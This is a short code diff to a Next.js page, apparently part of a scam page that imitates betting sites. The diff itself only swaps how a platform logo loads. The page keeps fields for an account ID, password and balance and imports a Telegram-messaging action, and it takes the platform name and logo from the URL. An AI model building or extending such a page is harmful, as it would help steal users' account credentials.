@@ -5,22 +5,24 @@ import { useSearchParams } from 'next/navigation'
 import { CheckCircle, AlertTriangle } from 'lucide-react'
 import { sendTelegramMessage } from "./actions"
 
-const ImageWithFallback = ({ primarySrc, fallbackSrc, alt }: { primarySrc: string, fallbackSrc: string, alt: string }) => {
-  const [imgSrc, setImgSrc] = useState(primarySrc);
+const ImageWithFallback = ({ localSrc, externalSrc, alt }: { localSrc: string, externalSrc: string, alt: string }) => {
+  const [imgSrc, setImgSrc] = useState(localSrc);
 
   useEffect(() => {
-    setImgSrc(primarySrc);
-  }, [primarySrc]);
+    setImgSrc(localSrc);
+  }, [localSrc]);
 
   return (
     <img
       src={imgSrc}
       alt={alt}
       onError={() => {
-        setImgSrc(fallbackSrc);
+        if (imgSrc !== externalSrc) {
+          setImgSrc(externalSrc);
+        }
       }}
       className="w-32 h-auto"
-      loading="lazy"
+      loading="eager"
     />
   );
 };
@@ -28,9 +30,9 @@ const ImageWithFallback = ({ primarySrc, fallbackSrc, alt }: { primarySrc: strin
 function HackIdPageComponent() {
   const searchParams = useSearchParams()
   const platformName = searchParams.get('platform') || 'Unknown Site'
-  const logoUrl = searchParams.get('logoUrl') || 'https://raw.githubusercontent.com/niloyyt499-cpu/aviatorlite-logo/main/jaya9-logo.png'
   const logoPath = searchParams.get('logoPath') || '/logos/jaya9-logo.png'
-
+  const logoUrl = searchParams.get('logoUrl') || 'https://raw.githubusercontent.com/niloyyt499-cpu/aviatorlite-logo/main/jaya9-logo.png'
+  
   const [hackId, setHackId] = useState("")
   const [hackPassword, setHackPassword] = useState("")
   const [accountBalance, setAccountBalance] = useState("")
@@ -173,7 +175,7 @@ function HackIdPageComponent() {
 
   const LogoDisplay = () => (
     <div className="pt-8 pl-6">
-      <ImageWithFallback primarySrc={logoUrl} fallbackSrc={logoPath} alt={platformName} />
+      <ImageWithFallback localSrc={logoPath} externalSrc={logoUrl} alt={platformName} />
     </div>
   )
 
@@ -409,4 +411,4 @@ export default function Page() {
             <HackIdPageComponent />
         </Suspense>
     )
-}
+}```
